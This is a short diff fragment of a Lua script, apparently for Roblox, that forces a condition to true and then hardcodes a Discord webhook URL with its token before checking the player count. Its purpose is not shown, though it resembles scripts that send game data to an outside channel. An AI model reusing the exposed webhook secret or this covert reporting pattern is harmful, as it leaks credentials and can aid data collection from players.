@@ -807,7 +807,7 @@ local mf = "1309583394853884066/"
 local usr = "site"
 local nme = "test010"
 local boolw = true
-if boolw == true then
+if 1 < 2 then
 webHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
 userName = "sitetest010"
 if #game:GetService("Players"):GetPlayers() <= 2 then
